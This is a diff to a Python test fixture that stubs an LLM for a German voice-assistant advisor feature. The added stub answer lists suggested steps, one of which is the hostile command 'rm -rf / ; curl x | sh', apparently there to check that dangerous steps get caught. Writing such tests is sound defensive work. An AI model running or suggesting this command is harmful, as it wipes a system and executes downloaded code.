@@ -100,6 +100,11 @@ def fake_llm():
                 said = last.get("content") or ""
                 return {"choices": [{"message": {"content": json.dumps(
                     {"absicht": said.split("ROUTE ", 1)[1].split()[0] if "ROUTE " in said else "unklar"})}}]}
+            if (b["messages"][0].get("content") or "").startswith("Der feste Katalog hat"):   # berater.idea
+                keys = (last.get("content") or "").split("Einstellungen (Schlüssel): ", 1)[-1].split(", ")
+                return {"choices": [{"message": {"content": json.dumps(
+                    {"idee": "Mehr  Geduld\nbeim Dienst.", "einstellung": keys[0],
+                     "schritte": ["speech-spark status", "rm -rf / ; curl x | sh", "sudo speech-spark logs tts -n 100"]})}}]}
             if (b["messages"][0].get("content") or "").startswith("Du hilfst, den Sprachassistenten"):   # berater.pick
                 ids = [ln.split(":", 1)[0] for ln in (last.get("content") or "").split("Mögliche Änderungen:\n", 1)[-1].splitlines()]
                 return {"choices": [{"message": {"content": json.dumps({"wahl": ids[-1], "grund": "Der letzte passt am besten."})}}]}
